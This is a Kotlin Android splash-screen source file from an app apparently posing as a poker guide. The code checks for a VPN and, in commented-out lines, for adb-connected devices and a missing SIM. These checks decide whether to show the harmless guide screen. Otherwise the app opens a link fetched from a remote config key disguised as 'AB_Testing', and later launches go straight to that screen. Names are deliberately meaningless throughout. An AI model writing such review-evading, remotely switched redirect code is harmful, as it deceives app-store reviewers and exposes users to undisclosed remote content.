package com.pokerhouse.poker.guider.dom.app

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.preference.PreferenceManager
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.pokerhouse.poker.guider.dom.app.databinding.ActivitySplashBinding
import java.io.BufferedReader
import java.io.InputStreamReader

class SplashActivity : AppCompatActivity() {
    private lateinit var absurdVariable1: ActivitySplashBinding
    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var databaseHelper: DatabaseHelper

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        absurdVariable1 = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(absurdVariable1.root)

        sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this)

        databaseHelper = DatabaseHelper(this)

        val isFirstLogin = databaseHelper.isFirstLogin()

        if (isFirstLogin) {
            Log.d("syka", "syka6")
            initCrazyApp()
            databaseHelper.updateFirstLoginStatus(false)


        } else {
            Log.d("syka", "syka5")
            val intention = Intent(this@SplashActivity, SecondActivity::class.java)
            startActivity(intention)
            finish()

        }
    }

    private fun isSecondLaunch(): Boolean {
        val weirdCount = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE).getInt("launchCount", 0)
        return weirdCount >= 1
    }

    private fun initCrazyApp() {
        if (ludicrousMethod2(this)) {
//                if (ludicrousMethod3(this) ) {
//                    Log.d("syka", "syka4")

//                if (ludicrousMethod3(this) || ridiculousMethod6() || absurdMethod7(this)) {
                if (ludicrousMethod3(this) ) {
                startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                finish()
            } else {
                preposterousMethod5()
            }
        } else {
            Toast.makeText(this, "Please check your internet", Toast.LENGTH_SHORT).show()
        }
    }

    private fun preposterousMethod5() {

        var sillyVariable5: FirebaseRemoteConfig
        sillyVariable5 = FirebaseRemoteConfig.getInstance()
        val absurdVariable6 = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(0)
            .build()
        sillyVariable5.setConfigSettingsAsync(absurdVariable6)
        sillyVariable5.setDefaultsAsync(R.xml.cgremote)
        sillyVariable5.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {

                    if (!sillyVariable5.all.containsKey("AB_Testing")) {
                        Log.d("syka", "syka3")

                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                    } else {
                        val link = sillyVariable5.getString("AB_Testing")
//                        if (link.isNullOrEmpty() && !link.startsWith("http") == false) {
                        if (link.isNullOrEmpty() || !link.startsWith("http")) {
                            Log.d("syka", "syka2")

                            val intention = Intent(this@SplashActivity, MainActivity::class.java)
                            startActivity(intention)
                            finish()
                        } else {
                            Log.d("syka", "syka8")

                            val intention = Intent(this@SplashActivity, SecondActivity::class.java)
                            intention.putExtra("nonsensicalVariable9", link)
                            startActivity(intention)
                            finish()
                        }
                    }
                } else {
                    Log.d("syka", "syka1")
                    startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                }
            }
    }

//    private fun firstL(): Boolean {
//        val weirdCount = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE).getInt("launchCount", 0)
//        getSharedPreferences("MyPrefs", Context.MODE_PRIVATE).edit().putInt("launchCount", weirdCount + 1).apply()
//        return weirdCount == 1
//    }

    private fun ludicrousMethod2(context: Context): Boolean {
        val absurdVariable10 = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        absurdVariable10?.run {
            val network = activeNetwork
            val networkCapabilities = getNetworkCapabilities(network)
            return networkCapabilities?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) ?: false
        }
        return false
    }

    private fun ludicrousMethod3(context: Context): Boolean {
        val absurdVariable13 = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networks = absurdVariable13.allNetworks
        for (network in networks) {
            val absurdVariable14 = absurdVariable13.getNetworkInfo(network)
            if (absurdVariable14?.type == ConnectivityManager.TYPE_VPN) {
                return absurdVariable14?.isConnected ?: false
            }
        }
        return false
    }

    private fun ridiculousMethod6(): Boolean {
        try {
            val processBuilder = ProcessBuilder("adb", "devices")
            val process = processBuilder.start()

            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String? = null
            val output = StringBuilder()
            while ({ line = reader.readLine(); line }() != null) {
                output.append(line)
            }
            val adbOutput = output.toString()
            return adbOutput.contains("device")
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return false
    }

    private fun absurdMethod7(context: Context): Boolean {
        val absurdVariable15 = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return absurdVariable15.simState == TelephonyManager.SIM_STATE_ABSENT
    }
}


